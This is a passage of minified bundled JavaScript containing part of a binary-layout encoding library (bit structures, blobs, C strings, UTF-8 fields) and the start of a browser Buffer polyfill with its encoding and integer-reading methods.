                    return 0 > e && (e += 4294967296), e
                }
                class B extends n {
                    constructor(e, t, n) {
                        if (!(e instanceof a || e instanceof u)) throw new TypeError("word must be a UInt or UIntBE layout");
                        if ("string" === typeof t && void 0 === n && (n = t, t = void 0), 4 < e.span) throw new RangeError("word cannot exceed 32 bits");
                        super(e.span, n), this.word = e, this.msb = !!t, this.fields = [];
                        let r = 0;
                        this._packedSetValue = function(e) {
                            return r = M(e), this
                        }, this._packedGetValue = function() {
                            return r
                        }
                    }
                    decode(e, t) {
                        const n = this.makeDestinationObject();
                        void 0 === t && (t = 0);
                        const r = this.word.decode(e, t);
                        this._packedSetValue(r);
                        for (const i of this.fields) void 0 !== i.property && (n[i.property] = i.decode(r));
                        return n
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0);
                        const r = this.word.decode(t, n);
                        this._packedSetValue(r);
                        for (const i of this.fields)
                            if (void 0 !== i.property) {
                                const t = e[i.property];
                                void 0 !== t && i.encode(t)
                            }
                        return this.word.encode(this._packedGetValue(), t, n)
                    }
                    addField(e, t) {
                        const n = new T(this, e, t);
                        return this.fields.push(n), n
                    }
                    addBoolean(e) {
                        const t = new O(this, e);
                        return this.fields.push(t), t
                    }
                    fieldFor(e) {
                        if ("string" !== typeof e) throw new TypeError("property must be string");
                        for (const t of this.fields)
                            if (t.property === e) return t
                    }
                }
                class T {
                    constructor(e, t, n) {
                        if (!(e instanceof B)) throw new TypeError("container must be a BitStructure");
                        if (!Number.isInteger(t) || 0 >= t) throw new TypeError("bits must be positive integer");
                        const r = 8 * e.span,
                            i = e.fields.reduce(((e, t) => e + t.bits), 0);
                        if (t + i > r) throw new Error("bits too long for span remainder (" + (r - i) + " of " + r + " remain)");
                        this.container = e, this.bits = t, this.valueMask = (1 << t) - 1, 32 === t && (this.valueMask = 4294967295), this.start = i, this.container.msb && (this.start = r - i - t), this.wordMask = M(this.valueMask << this.start), this.property = n
                    }
                    decode() {
                        return M(this.container._packedGetValue() & this.wordMask) >>> this.start
                    }
                    encode(e) {
                        if (!Number.isInteger(e) || e !== M(e & this.valueMask)) throw new TypeError(r("BitField.encode", this) + " value must be integer not exceeding " + this.valueMask);
                        const t = this.container._packedGetValue(),
                            n = M(e << this.start);
                        this.container._packedSetValue(M(t & ~this.wordMask) | n)
                    }
                }
                class O extends T {
                    constructor(e, t) {
                        super(e, 1, t)
                    }
                    decode(e, t) {
                        return !!T.prototype.decode.call(this, e, t)
                    }
                    encode(e) {
                        return "boolean" === typeof e && (e = +e), T.prototype.encode.call(this, e)
                    }
                }
                class C extends n {
                    constructor(e, t) {
                        if (!(e instanceof i && e.isCount() || Number.isInteger(e) && 0 <= e)) throw new TypeError("length must be positive integer or an unsigned integer ExternalLayout");
                        let n = -1;
                        e instanceof i || (n = e), super(n, t), this.length = e
                    }
                    getSpan(e, t) {
                        let n = this.span;
                        return 0 > n && (n = this.length.decode(e, t)), n
                    }
                    decode(e, t) {
                        void 0 === t && (t = 0);
                        let n = this.span;
                        return 0 > n && (n = this.length.decode(e, t)), e.slice(t, t + n)
                    }
                    encode(e, t, n) {
                        let o = this.length;
                        if (this.length instanceof i && (o = e.length), !Buffer.isBuffer(e) || o !== e.length) throw new TypeError(r("Blob.encode", this) + " requires (length " + o + ") Buffer as src");
                        if (n + o > t.length) throw new RangeError("encoding overruns Buffer");
                        return t.write(e.toString("hex"), n, o, "hex"), this.length instanceof i && this.length.encode(o, t, n), o
                    }
                }
                class P extends n {
                    constructor(e) {
                        super(-1, e)
                    }
                    getSpan(e, t) {
                        if (!Buffer.isBuffer(e)) throw new TypeError("b must be a Buffer");
                        void 0 === t && (t = 0);
                        let n = t;
                        for (; n < e.length && 0 !== e[n];) n += 1;
                        return 1 + n - t
                    }
                    decode(e, t, n) {
                        void 0 === t && (t = 0);
                        let r = this.getSpan(e, t);
                        return e.slice(t, t + r - 1).toString("utf-8")
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0), "string" !== typeof e && (e = e.toString());
                        const r = new Buffer(e, "utf8"),
                            i = r.length;
                        if (n + i > t.length) throw new RangeError("encoding overruns Buffer");
                        return r.copy(t, n), t[n + i] = 0, i + 1
                    }
                }
                class L extends n {
                    constructor(e, t) {
                        if ("string" === typeof e && void 0 === t && (t = e, e = void 0), void 0 === e) e = -1;
                        else if (!Number.isInteger(e)) throw new TypeError("maxSpan must be an integer");
                        super(-1, t), this.maxSpan = e
                    }
                    getSpan(e, t) {
                        if (!Buffer.isBuffer(e)) throw new TypeError("b must be a Buffer");
                        return void 0 === t && (t = 0), e.length - t
                    }
                    decode(e, t, n) {
                        void 0 === t && (t = 0);
                        let r = this.getSpan(e, t);
                        if (0 <= this.maxSpan && this.maxSpan < r) throw new RangeError("text length exceeds maxSpan");
                        return e.slice(t, t + r).toString("utf-8")
                    }
                    encode(e, t, n) {
                        void 0 === n && (n = 0), "string" !== typeof e && (e = e.toString());
                        const r = new Buffer(e, "utf8"),
                            i = r.length;
                        if (0 <= this.maxSpan && this.maxSpan < i) throw new RangeError("text length exceeds maxSpan");
                        if (n + i > t.length) throw new RangeError("encoding overruns Buffer");
                        return r.copy(t, n), i
                    }
                }
                class N extends n {
                    constructor(e, t) {
                        super(0, t), this.value = e
                    }
                    decode(e, t, n) {
                        return this.value
                    }
                    encode(e, t, n) {
                        return 0
                    }
                }
                t.ExternalLayout = i, t.GreedyCount = o, t.OffsetLayout = s, t.UInt = a, t.UIntBE = u, t.Int = c, t.IntBE = l, t.Float = w, t.FloatBE = b, t.Double = v, t.DoubleBE = A, t.Sequence = k, t.Structure = _, t.UnionDiscriminator = E, t.UnionLayoutDiscriminator = S, t.Union = I, t.VariantLayout = x, t.BitStructure = B, t.BitField = T, t.Boolean = O, t.Blob = C, t.CString = P, t.UTF8 = L, t.Constant = N, t.greedy = (e, t) => new o(e, t), t.offset = (e, t, n) => new s(e, t, n), t.u8 = e => new a(1, e), t.u16 = e => new a(2, e), t.u24 = e => new a(3, e), t.u32 = e => new a(4, e), t.u40 = e => new a(5, e), t.u48 = e => new a(6, e), t.nu64 = e => new p(e), t.u16be = e => new u(2, e), t.u24be = e => new u(3, e), t.u32be = e => new u(4, e), t.u40be = e => new u(5, e), t.u48be = e => new u(6, e), t.nu64be = e => new y(e), t.s8 = e => new c(1, e), t.s16 = e => new c(2, e), t.s24 = e => new c(3, e), t.s32 = e => new c(4, e), t.s40 = e => new c(5, e), t.s48 = e => new c(6, e), t.ns64 = e => new g(e), t.s16be = e => new l(2, e), t.s24be = e => new l(3, e), t.s32be = e => new l(4, e), t.s40be = e => new l(5, e), t.s48be = e => new l(6, e), t.ns64be = e => new m(e), t.f32 = e => new w(e), t.f32be = e => new b(e), t.f64 = e => new v(e), t.f64be = e => new A(e), t.struct = (e, t, n) => new _(e, t, n), t.bits = (e, t, n) => new B(e, t, n), t.seq = (e, t, n) => new k(e, t, n), t.union = (e, t, n) => new I(e, t, n), t.unionLayoutDiscriminator = (e, t) => new S(e, t), t.blob = (e, t) => new C(e, t), t.cstr = e => new P(e), t.utf8 = (e, t) => new L(e, t), t.const = (e, t) => new N(e, t)
            },
            9778: (e, t, n) => {
                "use strict";
                const r = n(2009),
                    i = n(4038),
                    o = "function" === typeof Symbol && "function" === typeof Symbol.for ? Symbol.for("nodejs.util.inspect.custom") : null;
                t.Buffer = u, t.SlowBuffer = function(e) {
                    +e != e && (e = 0);
                    return u.alloc(+e)
                }, t.INSPECT_MAX_BYTES = 50;
                const s = 2147483647;

                function a(e) {
                    if (e > s) throw new RangeError('The value "' + e + '" is invalid for option "size"');
                    const t = new Uint8Array(e);
                    return Object.setPrototypeOf(t, u.prototype), t
                }

                function u(e, t, n) {
                    if ("number" === typeof e) {
                        if ("string" === typeof t) throw new TypeError('The "string" argument must be of type string. Received type number');
                        return f(e)
                    }
                    return c(e, t, n)
                }

                function c(e, t, n) {
                    if ("string" === typeof e) return function(e, t) {
                        "string" === typeof t && "" !== t || (t = "utf8");
                        if (!u.isEncoding(t)) throw new TypeError("Unknown encoding: " + t);
                        const n = 0 | y(e, t);
                        let r = a(n);
                        const i = r.write(e, t);
                        i !== n && (r = r.slice(0, i));
                        return r
                    }(e, t);
                    if (ArrayBuffer.isView(e)) return function(e) {
                        if (Y(e, Uint8Array)) {
                            const t = new Uint8Array(e);
                            return d(t.buffer, t.byteOffset, t.byteLength)
                        }
                        return h(e)
                    }(e);
                    if (null == e) throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof e);
                    if (Y(e, ArrayBuffer) || e && Y(e.buffer, ArrayBuffer)) return d(e, t, n);
                    if ("undefined" !== typeof SharedArrayBuffer && (Y(e, SharedArrayBuffer) || e && Y(e.buffer, SharedArrayBuffer))) return d(e, t, n);
                    if ("number" === typeof e) throw new TypeError('The "value" argument must not be of type number. Received type number');
                    const r = e.valueOf && e.valueOf();
                    if (null != r && r !== e) return u.from(r, t, n);
                    const i = function(e) {
                        if (u.isBuffer(e)) {
                            const t = 0 | p(e.length),
                                n = a(t);
                            return 0 === n.length || e.copy(n, 0, 0, t), n
                        }
                        if (void 0 !== e.length) return "number" !== typeof e.length || Z(e.length) ? a(0) : h(e);
                        if ("Buffer" === e.type && Array.isArray(e.data)) return h(e.data)
                    }(e);
                    if (i) return i;
                    if ("undefined" !== typeof Symbol && null != Symbol.toPrimitive && "function" === typeof e[Symbol.toPrimitive]) return u.from(e[Symbol.toPrimitive]("string"), t, n);
                    throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof e)
                }

                function l(e) {
                    if ("number" !== typeof e) throw new TypeError('"size" argument must be of type number');
                    if (e < 0) throw new RangeError('The value "' + e + '" is invalid for option "size"')
                }

                function f(e) {
                    return l(e), a(e < 0 ? 0 : 0 | p(e))
                }

                function h(e) {
                    const t = e.length < 0 ? 0 : 0 | p(e.length),
                        n = a(t);
                    for (let r = 0; r < t; r += 1) n[r] = 255 & e[r];
                    return n
                }

                function d(e, t, n) {
                    if (t < 0 || e.byteLength < t) throw new RangeError('"offset" is outside of buffer bounds');
                    if (e.byteLength < t + (n || 0)) throw new RangeError('"length" is outside of buffer bounds');
                    let r;
                    return r = void 0 === t && void 0 === n ? new Uint8Array(e) : void 0 === n ? new Uint8Array(e, t) : new Uint8Array(e, t, n), Object.setPrototypeOf(r, u.prototype), r
                }

                function p(e) {
                    if (e >= s) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + s.toString(16) + " bytes");
                    return 0 | e
                }

                function y(e, t) {
                    if (u.isBuffer(e)) return e.length;
                    if (ArrayBuffer.isView(e) || Y(e, ArrayBuffer)) return e.byteLength;
                    if ("string" !== typeof e) throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof e);
                    const n = e.length,
                        r = arguments.length > 2 && !0 === arguments[2];
                    if (!r && 0 === n) return 0;
                    let i = !1;
                    for (;;) switch (t) {
                        case "ascii":
                        case "latin1":
                        case "binary":
                            return n;
                        case "utf8":
                        case "utf-8":
                            return V(e).length;
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return 2 * n;
                        case "hex":
                            return n >>> 1;
                        case "base64":
                            return Q(e).length;
                        default:
                            if (i) return r ? -1 : V(e).length;
                            t = ("" + t).toLowerCase(), i = !0
                    }
                }

                function g(e, t, n) {
                    let r = !1;
                    if ((void 0 === t || t < 0) && (t = 0), t > this.length) return "";
                    if ((void 0 === n || n > this.length) && (n = this.length), n <= 0) return "";
                    if ((n >>>= 0) <= (t >>>= 0)) return "";
                    for (e || (e = "utf8");;) switch (e) {
                        case "hex":
                            return T(this, t, n);
                        case "utf8":
                        case "utf-8":
                            return I(this, t, n);
                        case "ascii":
                            return M(this, t, n);
                        case "latin1":
                        case "binary":
                            return B(this, t, n);
                        case "base64":
                            return S(this, t, n);
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return O(this, t, n);
                        default:
                            if (r) throw new TypeError("Unknown encoding: " + e);
                            e = (e + "").toLowerCase(), r = !0
                    }
                }

                function m(e, t, n) {
                    const r = e[t];
                    e[t] = e[n], e[n] = r
                }

                function w(e, t, n, r, i) {
                    if (0 === e.length) return -1;
                    if ("string" === typeof n ? (r = n, n = 0) : n > 2147483647 ? n = 2147483647 : n < -2147483648 && (n = -2147483648), Z(n = +n) && (n = i ? 0 : e.length - 1), n < 0 && (n = e.length + n), n >= e.length) {
                        if (i) return -1;
                        n = e.length - 1
                    } else if (n < 0) {
                        if (!i) return -1;
                        n = 0
                    }
                    if ("string" === typeof t && (t = u.from(t, r)), u.isBuffer(t)) return 0 === t.length ? -1 : b(e, t, n, r, i);
                    if ("number" === typeof t) return t &= 255, "function" === typeof Uint8Array.prototype.indexOf ? i ? Uint8Array.prototype.indexOf.call(e, t, n) : Uint8Array.prototype.lastIndexOf.call(e, t, n) : b(e, [t], n, r, i);
                    throw new TypeError("val must be string, number or Buffer")
                }

                function b(e, t, n, r, i) {
                    let o, s = 1,
                        a = e.length,
                        u = t.length;
                    if (void 0 !== r && ("ucs2" === (r = String(r).toLowerCase()) || "ucs-2" === r || "utf16le" === r || "utf-16le" === r)) {
                        if (e.length < 2 || t.length < 2) return -1;
                        s = 2, a /= 2, u /= 2, n /= 2
                    }

                    function c(e, t) {
                        return 1 === s ? e[t] : e.readUInt16BE(t * s)
                    }
                    if (i) {
                        let r = -1;
                        for (o = n; o < a; o++)
                            if (c(e, o) === c(t, -1 === r ? 0 : o - r)) {
                                if (-1 === r && (r = o), o - r + 1 === u) return r * s
                            } else -1 !== r && (o -= o - r), r = -1
                    } else
                        for (n + u > a && (n = a - u), o = n; o >= 0; o--) {
                            let n = !0;
                            for (let r = 0; r < u; r++)
                                if (c(e, o + r) !== c(t, r)) {
                                    n = !1;
                                    break
                                }
                            if (n) return o
                        }
                    return -1
                }

                function v(e, t, n, r) {
                    n = Number(n) || 0;
                    const i = e.length - n;
                    r ? (r = Number(r)) > i && (r = i) : r = i;
                    const o = t.length;
                    let s;
                    for (r > o / 2 && (r = o / 2), s = 0; s < r; ++s) {
                        const r = parseInt(t.substr(2 * s, 2), 16);
                        if (Z(r)) return s;
                        e[n + s] = r
                    }
                    return s
                }

                function A(e, t, n, r) {
                    return G(V(t, e.length - n), e, n, r)
                }

                function k(e, t, n, r) {
                    return G(function(e) {
                        const t = [];
                        for (let n = 0; n < e.length; ++n) t.push(255 & e.charCodeAt(n));
                        return t
                    }(t), e, n, r)
                }

                function _(e, t, n, r) {
                    return G(Q(t), e, n, r)
                }

                function E(e, t, n, r) {
                    return G(function(e, t) {
                        let n, r, i;
                        const o = [];
                        for (let s = 0; s < e.length && !((t -= 2) < 0); ++s) n = e.charCodeAt(s), r = n >> 8, i = n % 256, o.push(i), o.push(r);
                        return o
                    }(t, e.length - n), e, n, r)
                }

                function S(e, t, n) {
                    return 0 === t && n === e.length ? r.fromByteArray(e) : r.fromByteArray(e.slice(t, n))
                }

                function I(e, t, n) {
                    n = Math.min(e.length, n);
                    const r = [];
                    let i = t;
                    for (; i < n;) {
                        const t = e[i];
                        let o = null,
                            s = t > 239 ? 4 : t > 223 ? 3 : t > 191 ? 2 : 1;
                        if (i + s <= n) {
                            let n, r, a, u;
                            switch (s) {
                                case 1:
                                    t < 128 && (o = t);
                                    break;
                                case 2:
                                    n = e[i + 1], 128 === (192 & n) && (u = (31 & t) << 6 | 63 & n, u > 127 && (o = u));
                                    break;
                                case 3:
                                    n = e[i + 1], r = e[i + 2], 128 === (192 & n) && 128 === (192 & r) && (u = (15 & t) << 12 | (63 & n) << 6 | 63 & r, u > 2047 && (u < 55296 || u > 57343) && (o = u));
                                    break;
                                case 4:
                                    n = e[i + 1], r = e[i + 2], a = e[i + 3], 128 === (192 & n) && 128 === (192 & r) && 128 === (192 & a) && (u = (15 & t) << 18 | (63 & n) << 12 | (63 & r) << 6 | 63 & a, u > 65535 && u < 1114112 && (o = u))
                            }
                        }
                        null === o ? (o = 65533, s = 1) : o > 65535 && (o -= 65536, r.push(o >>> 10 & 1023 | 55296), o = 56320 | 1023 & o), r.push(o), i += s
                    }
                    return function(e) {
                        const t = e.length;
                        if (t <= x) return String.fromCharCode.apply(String, e);
                        let n = "",
                            r = 0;
                        for (; r < t;) n += String.fromCharCode.apply(String, e.slice(r, r += x));
                        return n
                    }(r)
                }
                t.kMaxLength = s, u.TYPED_ARRAY_SUPPORT = function() {
                    try {
                        const e = new Uint8Array(1),
                            t = {
                                foo: function() {
                                    return 42
                                }
                            };
                        return Object.setPrototypeOf(t, Uint8Array.prototype), Object.setPrototypeOf(e, t), 42 === e.foo()
                    } catch (e) {
                        return !1
                    }
                }(), u.TYPED_ARRAY_SUPPORT || "undefined" === typeof console || "function" !== typeof console.error || console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."), Object.defineProperty(u.prototype, "parent", {
                    enumerable: !0,
                    get: function() {
                        if (u.isBuffer(this)) return this.buffer
                    }
                }), Object.defineProperty(u.prototype, "offset", {
                    enumerable: !0,
                    get: function() {
                        if (u.isBuffer(this)) return this.byteOffset
                    }
                }), u.poolSize = 8192, u.from = function(e, t, n) {
                    return c(e, t, n)
                }, Object.setPrototypeOf(u.prototype, Uint8Array.prototype), Object.setPrototypeOf(u, Uint8Array), u.alloc = function(e, t, n) {
                    return function(e, t, n) {
                        return l(e), e <= 0 ? a(e) : void 0 !== t ? "string" === typeof n ? a(e).fill(t, n) : a(e).fill(t) : a(e)
                    }(e, t, n)
                }, u.allocUnsafe = function(e) {
                    return f(e)
                }, u.allocUnsafeSlow = function(e) {
                    return f(e)
                }, u.isBuffer = function(e) {
                    return null != e && !0 === e._isBuffer && e !== u.prototype
                }, u.compare = function(e, t) {
                    if (Y(e, Uint8Array) && (e = u.from(e, e.offset, e.byteLength)), Y(t, Uint8Array) && (t = u.from(t, t.offset, t.byteLength)), !u.isBuffer(e) || !u.isBuffer(t)) throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
                    if (e === t) return 0;
                    let n = e.length,
                        r = t.length;
                    for (let i = 0, o = Math.min(n, r); i < o; ++i)
                        if (e[i] !== t[i]) {
                            n = e[i], r = t[i];
                            break
                        }
                    return n < r ? -1 : r < n ? 1 : 0
                }, u.isEncoding = function(e) {
                    switch (String(e).toLowerCase()) {
                        case "hex":
                        case "utf8":
                        case "utf-8":
                        case "ascii":
                        case "latin1":
                        case "binary":
                        case "base64":
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return !0;
                        default:
                            return !1
                    }
                }, u.concat = function(e, t) {
                    if (!Array.isArray(e)) throw new TypeError('"list" argument must be an Array of Buffers');
                    if (0 === e.length) return u.alloc(0);
                    let n;
                    if (void 0 === t)
                        for (t = 0, n = 0; n < e.length; ++n) t += e[n].length;
                    const r = u.allocUnsafe(t);
                    let i = 0;
                    for (n = 0; n < e.length; ++n) {
                        let t = e[n];
                        if (Y(t, Uint8Array)) i + t.length > r.length ? (u.isBuffer(t) || (t = u.from(t)), t.copy(r, i)) : Uint8Array.prototype.set.call(r, t, i);
                        else {
                            if (!u.isBuffer(t)) throw new TypeError('"list" argument must be an Array of Buffers');
                            t.copy(r, i)
                        }
                        i += t.length
                    }
                    return r
                }, u.byteLength = y, u.prototype._isBuffer = !0, u.prototype.swap16 = function() {
                    const e = this.length;
                    if (e % 2 !== 0) throw new RangeError("Buffer size must be a multiple of 16-bits");
                    for (let t = 0; t < e; t += 2) m(this, t, t + 1);
                    return this
                }, u.prototype.swap32 = function() {
                    const e = this.length;
                    if (e % 4 !== 0) throw new RangeError("Buffer size must be a multiple of 32-bits");
                    for (let t = 0; t < e; t += 4) m(this, t, t + 3), m(this, t + 1, t + 2);
                    return this
                }, u.prototype.swap64 = function() {
                    const e = this.length;
                    if (e % 8 !== 0) throw new RangeError("Buffer size must be a multiple of 64-bits");
                    for (let t = 0; t < e; t += 8) m(this, t, t + 7), m(this, t + 1, t + 6), m(this, t + 2, t + 5), m(this, t + 3, t + 4);
                    return this
                }, u.prototype.toString = function() {
                    const e = this.length;
                    return 0 === e ? "" : 0 === arguments.length ? I(this, 0, e) : g.apply(this, arguments)
                }, u.prototype.toLocaleString = u.prototype.toString, u.prototype.equals = function(e) {
                    if (!u.isBuffer(e)) throw new TypeError("Argument must be a Buffer");
                    return this === e || 0 === u.compare(this, e)
                }, u.prototype.inspect = function() {
                    let e = "";
                    const n = t.INSPECT_MAX_BYTES;
                    return e = this.toString("hex", 0, n).replace(/(.{2})/g, "$1 ").trim(), this.length > n && (e += " ... "), "<Buffer " + e + ">"
                }, o && (u.prototype[o] = u.prototype.inspect), u.prototype.compare = function(e, t, n, r, i) {
                    if (Y(e, Uint8Array) && (e = u.from(e, e.offset, e.byteLength)), !u.isBuffer(e)) throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof e);
                    if (void 0 === t && (t = 0), void 0 === n && (n = e ? e.length : 0), void 0 === r && (r = 0), void 0 === i && (i = this.length), t < 0 || n > e.length || r < 0 || i > this.length) throw new RangeError("out of range index");
                    if (r >= i && t >= n) return 0;
                    if (r >= i) return -1;
                    if (t >= n) return 1;
                    if (this === e) return 0;
                    let o = (i >>>= 0) - (r >>>= 0),
                        s = (n >>>= 0) - (t >>>= 0);
                    const a = Math.min(o, s),
                        c = this.slice(r, i),
                        l = e.slice(t, n);
                    for (let u = 0; u < a; ++u)
                        if (c[u] !== l[u]) {
                            o = c[u], s = l[u];
                            break
                        }
                    return o < s ? -1 : s < o ? 1 : 0
                }, u.prototype.includes = function(e, t, n) {
                    return -1 !== this.indexOf(e, t, n)
                }, u.prototype.indexOf = function(e, t, n) {
                    return w(this, e, t, n, !0)
                }, u.prototype.lastIndexOf = function(e, t, n) {
                    return w(this, e, t, n, !1)
                }, u.prototype.write = function(e, t, n, r) {
                    if (void 0 === t) r = "utf8", n = this.length, t = 0;
                    else if (void 0 === n && "string" === typeof t) r = t, n = this.length, t = 0;
                    else {
                        if (!isFinite(t)) throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                        t >>>= 0, isFinite(n) ? (n >>>= 0, void 0 === r && (r = "utf8")) : (r = n, n = void 0)
                    }
                    const i = this.length - t;
                    if ((void 0 === n || n > i) && (n = i), e.length > 0 && (n < 0 || t < 0) || t > this.length) throw new RangeError("Attempt to write outside buffer bounds");
                    r || (r = "utf8");
                    let o = !1;
                    for (;;) switch (r) {
                        case "hex":
                            return v(this, e, t, n);
                        case "utf8":
                        case "utf-8":
                            return A(this, e, t, n);
                        case "ascii":
                        case "latin1":
                        case "binary":
                            return k(this, e, t, n);
                        case "base64":
                            return _(this, e, t, n);
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return E(this, e, t, n);
                        default:
                            if (o) throw new TypeError("Unknown encoding: " + r);
                            r = ("" + r).toLowerCase(), o = !0
                    }
                }, u.prototype.toJSON = function() {
                    return {
                        type: "Buffer",
                        data: Array.prototype.slice.call(this._arr || this, 0)
                    }
                };
                const x = 4096;

                function M(e, t, n) {
                    let r = "";
                    n = Math.min(e.length, n);
                    for (let i = t; i < n; ++i) r += String.fromCharCode(127 & e[i]);
                    return r
                }

                function B(e, t, n) {
                    let r = "";
                    n = Math.min(e.length, n);
                    for (let i = t; i < n; ++i) r += String.fromCharCode(e[i]);
                    return r
                }

                function T(e, t, n) {
                    const r = e.length;
                    (!t || t < 0) && (t = 0), (!n || n < 0 || n > r) && (n = r);
                    let i = "";
                    for (let o = t; o < n; ++o) i += J[e[o]];
                    return i
                }

                function O(e, t, n) {
                    const r = e.slice(t, n);
                    let i = "";
                    for (let o = 0; o < r.length - 1; o += 2) i += String.fromCharCode(r[o] + 256 * r[o + 1]);
                    return i
                }

                function C(e, t, n) {
                    if (e % 1 !== 0 || e < 0) throw new RangeError("offset is not uint");
                    if (e + t > n) throw new RangeError("Trying to access beyond buffer length")
                }

                function P(e, t, n, r, i, o) {
                    if (!u.isBuffer(e)) throw new TypeError('"buffer" argument must be a Buffer instance');
                    if (t > i || t < o) throw new RangeError('"value" argument is out of bounds');
                    if (n + r > e.length) throw new RangeError("Index out of range")
                }

                function L(e, t, n, r, i) {
                    H(t, r, i, e, n, 7);
                    let o = Number(t & BigInt(4294967295));
                    e[n++] = o, o >>= 8, e[n++] = o, o >>= 8, e[n++] = o, o >>= 8, e[n++] = o;
                    let s = Number(t >> BigInt(32) & BigInt(4294967295));
                    return e[n++] = s, s >>= 8, e[n++] = s, s >>= 8, e[n++] = s, s >>= 8, e[n++] = s, n
                }

                function N(e, t, n, r, i) {
                    H(t, r, i, e, n, 7);
                    let o = Number(t & BigInt(4294967295));
                    e[n + 7] = o, o >>= 8, e[n + 6] = o, o >>= 8, e[n + 5] = o, o >>= 8, e[n + 4] = o;
                    let s = Number(t >> BigInt(32) & BigInt(4294967295));
                    return e[n + 3] = s, s >>= 8, e[n + 2] = s, s >>= 8, e[n + 1] = s, s >>= 8, e[n] = s, n + 8
                }

                function R(e, t, n, r, i, o) {
                    if (n + r > e.length) throw new RangeError("Index out of range");
                    if (n < 0) throw new RangeError("Index out of range")
                }

                function D(e, t, n, r, o) {
                    return t = +t, n >>>= 0, o || R(e, 0, n, 4), i.write(e, t, n, r, 23, 4), n + 4
                }

                function z(e, t, n, r, o) {
                    return t = +t, n >>>= 0, o || R(e, 0, n, 8), i.write(e, t, n, r, 52, 8), n + 8
                }
                u.prototype.slice = function(e, t) {
                    const n = this.length;
                    (e = ~~e) < 0 ? (e += n) < 0 && (e = 0) : e > n && (e = n), (t = void 0 === t ? n : ~~t) < 0 ? (t += n) < 0 && (t = 0) : t > n && (t = n), t < e && (t = e);
                    const r = this.subarray(e, t);
                    return Object.setPrototypeOf(r, u.prototype), r
                }, u.prototype.readUintLE = u.prototype.readUIntLE = function(e, t, n) {
                    e >>>= 0, t >>>= 0, n || C(e, t, this.length);
                    let r = this[e],
                        i = 1,
                        o = 0;
                    for (; ++o < t && (i *= 256);) r += this[e + o] * i;
                    return r
                }, u.prototype.readUintBE = u.prototype.readUIntBE = function(e, t, n) {
                    e >>>= 0, t >>>= 0, n || C(e, t, this.length);
                    let r = this[e + --t],
                        i = 1;
                    for (; t > 0 && (i *= 256);) r += this[e + --t] * i;
                    return r
                }, u.prototype.readUint8 = u.prototype.readUInt8 = function(e, t) {
                    return e >>>= 0, t || C(e, 1, this.length), this[e]
                }, u.prototype.readUint16LE = u.prototype.readUInt16LE = function(e, t) {
                    return e >>>= 0, t || C(e, 2, this.length), this[e] | this[e + 1] << 8
                }, u.prototype.readUint16BE = u.prototype.readUInt16BE = function(e, t) {
                    return e >>>= 0, t || C(e, 2, this.length), this[e] << 8 | this[e + 1]
                }, u.prototype.readUint32LE = u.prototype.readUInt32LE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), (this[e] | this[e + 1] << 8 | this[e + 2] << 16) + 16777216 * this[e + 3]
                }, u.prototype.readUint32BE = u.prototype.readUInt32BE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), 16777216 * this[e] + (this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3])
                }, u.prototype.readBigUInt64LE = X((function(e) {
                    W(e >>>= 0, "offset");
                    const t = this[e],
                        n = this[e + 7];
                    void 0 !== t && void 0 !== n || K(e, this.length - 8);
                    const r = t + 256 * this[++e] + 65536 * this[++e] + this[++e] * 2 ** 24,
                        i = this[++e] + 256 * this[++e] + 65536 * this[++e] + n * 2 ** 24;
                    return BigInt(r) + (BigInt(i) << BigInt(32))
                })), u.prototype.readBigUInt64BE = X((function(e) {
                    W(e >>>= 0, "offset");
                    const t = this[e],
                        n = this[e + 7];
                    void 0 !== t && void 0 !== n || K(e, this.length - 8);
                    const r = t * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + this[++e],
                        i = this[++e] * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + n;
                    return (BigInt(r) << BigInt(32)) + BigInt(i)
                })), u.prototype.readIntLE = function(e, t, n) {
                    e >>>= 0, t >>>= 0, n || C(e, t, this.length);
                    let r = this[e],
                        i = 1,
                        o = 0;
                    for (; ++o < t && (i *= 256);) r += this[e + o] * i;
                    return i *= 128, r >= i && (r -= Math.pow(2, 8 * t)), r
                }, u.prototype.readIntBE = function(e, t, n) {
                    e >>>= 0, t >>>= 0, n || C(e, t, this.length);
                    let r = t,
                        i = 1,
                        o = this[e + --r];
                    for (; r > 0 && (i *= 256);) o += this[e + --r] * i;
                    return i *= 128, o >= i && (o -= Math.pow(2, 8 * t)), o
                }, u.prototype.readInt8 = function(e, t) {
                    return e >>>= 0, t || C(e, 1, this.length), 128 & this[e] ? -1 * (255 - this[e] + 1) : this[e]
                }, u.prototype.readInt16LE = function(e, t) {
                    e >>>= 0, t || C(e, 2, this.length);
                    const n = this[e] | this[e + 1] << 8;
                    return 32768 & n ? 4294901760 | n : n
                }, u.prototype.readInt16BE = function(e, t) {
                    e >>>= 0, t || C(e, 2, this.length);
                    const n = this[e + 1] | this[e] << 8;
                    return 32768 & n ? 4294901760 | n : n
                }, u.prototype.readInt32LE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), this[e] | this[e + 1] << 8 | this[e + 2] << 16 | this[e + 3] << 24
                }, u.prototype.readInt32BE = function(e, t) {
                    return e >>>= 0, t || C(e, 4, this.length), this[e] << 24 | this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3]
                }, u.prototype.readBigInt64LE = X((function(e) {
                    W(e >>>= 0, "offset");
                    const t = this[e],
                        n = this[e + 7];
